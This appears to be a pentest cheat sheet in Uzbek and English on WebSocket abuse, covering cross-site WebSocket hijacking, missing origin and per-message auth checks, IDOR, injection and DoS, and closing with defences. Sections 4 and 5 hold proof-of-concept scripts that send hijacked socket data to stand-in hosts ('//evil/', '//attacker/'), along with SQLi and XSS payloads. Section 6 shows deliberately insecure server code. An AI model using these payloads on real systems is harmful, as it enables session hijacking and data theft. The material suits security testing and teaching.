# WebSocket Abuse

## 1. Ta'rif
WebSocket — realtime ikki tomonlama kanal (chat, trading, notifications). Zaiflik: auth yo'q connection, message injection, IDOR over WS, CSWSH (Cross-Site WebSocket Hijacking), origin check yo'q, DoS.

## 2. Qayerdan kelib chiqadi
- Handshake auth'ni tekshirmaydi (Origin check yo'q)
- Session — cookie bilan avtomatik uzatiladi (CSWSH: attacker saytidan WS'ga connect)
- Message handling: log/action bilan bir xil — yo'q auth per message
- Sub-protocol/subscriber (join/leave) validation yo'q
- XSS combo: `send` reftar
- Rate limit yo'q — flooding

## 3. Turlari
| Tur | Misol |
|-----|-------|
| Missing Origin check | CSWSH |
| No auth per message | any client can act |
| IDOR over WS | join private channel id |
| Message injection | SQLi/NoSQLi/handled parameter |
| DoS | floods, zip bombs |
| Subprotocol mix | send evil protocol |

## 4. Metodologiya
1. WS endpoint topish: app'da `ws://wss://`, DevTools Network → WS frames (Burp ekatipik).
2. Handshake tekshirish:
   - Origin bor, to'g'ri bloklanadimi
   - **CSWSH**: 
     ```html
     <script>
     var ws = new WebSocket('wss://target.com/ws', 'websocket');
     ws.onopen = function(){ ws.send('{"action":"getUser","id":1}'); };
     ws.onmessage = function(e){ fetch('//evil/'+e.data); };
     </script>
     ```
     — cookie bemalol auto-submit, server origin tekshirmasa → session hijack.
3. Har bir book/message'ga auth tekshiriladimi:
   - Connect hold boshqa user'ning channel/private message'siga (IDOR).
4. Message fields injection:
   - `{"action": "search", "q": "' OR 1=1--"}` — SQLi
   - JSON parse — prototype pollution
5. Username/user_id haydo (subscriber to arbitrary).
6. DoS: million ping/pong, `100MB` payload.

## 5. Payload'lar / PoC
```
# CSWSH PoC (origin tekshirilmasa)
<script>
var ws = new WebSocket('wss://target.com/socket');
ws.onopen = function(){ this.send('{"cmd":"fetchProfile","uid":1}'); };
ws.onmessage = function(e){ new Image().src='//attacker/?p='+e.data; };
</script>

# Message injection
{"cmd":"msg","to":"admin","body":"<img src=x onerror=alert(1)>"}
{"cmd":"subscribe","room":"private/42"}
{"cmd":"query","sql":"SELECT * FROM users"}
# DoS: 1GB base64 frame
```
## 6. Zaif code misollari
```python
# ZAIF — origin check yo'q
@asyncio websockets.serve(handler, "0.0.0.0", 8765)
async def handler(websocket, path):
    # websocket.origin          - tekshirilmaydi!
    # websocket.cookies         - auth ishlatilmaydi
    msg = json.loads(await websocket.recv())
    handle(msg)                  # per-message auth yo'q

# Node (ws) ZAIF
const wss = new WebSocketServer({ port: 8080 });
wss.on('connection', (ws, req) => {   // req.headers.origin ignored
  ws.on('message', m => runAction(m));  // auth per action yo'q
});
```
## 7. Nimalarga ahamiyat berish (checklist)
- [ ] Handshake Origin validation (not present/regex)
- [ ] Cookie asosida auth — CSWSH ehtimol
- [ ] Per-message authorization (her message user_id)
- [ ] Subscribe/join private rooms — idor
- [ ] JSON, `__proto__`, injection in message body
- [ ] Rate limit / frame size limit
- [ ] WS + XSS combo — token on Ws url
- [ ] Connection info leak (user enumer)
## 8. Himoya
- Origin validation (exact match) + same-origin policy
- Auth token in handshake (per-connection), verify each message
- Authorization per resource/action; allowlist rooms
- Rate limiting, frame size limits, ping/pong timeouts
- Do not store sensitive info in auth-free socket url